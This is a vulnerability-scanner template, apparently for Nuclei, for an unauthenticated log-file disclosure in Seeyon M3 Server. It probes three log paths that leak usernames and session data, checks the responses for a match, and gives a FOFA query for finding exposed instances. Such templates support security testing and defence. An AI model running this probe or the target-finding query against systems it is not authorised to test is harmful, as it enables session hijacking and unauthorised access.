id: seeyon-m3-server-disclosure
info:
  name: 致远 M3 autoLogin.log - 敏感信息泄露漏洞
  author: leadlife
  severity: high
  description: M3移动办公是致远互联打造的一站式智能工作平台，提供全方位的企业移动业务管理，致力于构建以人为中心的智能化移动应用场景，促进人员工作积极性和创造力，提升企业效率和效能，是为企业量身定制的移动智慧协同平台。 在致远M3 server 的/mobile_portal/logs/autoLogin.log 存在敏感信息泄露漏洞，攻击者可利用该漏洞通过server以下日志文件未授权访问泄露登陆用户名及session等敏感信息。
  reference: 
    - https://github.com/wy876/POC/blob/main/%E8%87%B4%E8%BF%9CM3%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    fofa-query: title="M3-Server" || "M3-Server 已启动"
  tags: seeyon,disclosure,oa

http:
  - method: GET
    path:
      - "{{BaseURL}}/mobile_portal/logs/autoLogin.log"
      - "{{BaseURL}}/mobile_portal/logs/app.log"
      - "{{BaseURL}}/mobile_portal/logs/requset.log"

    stop-at-first-match: true
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(body,'#INFO')
        condition: and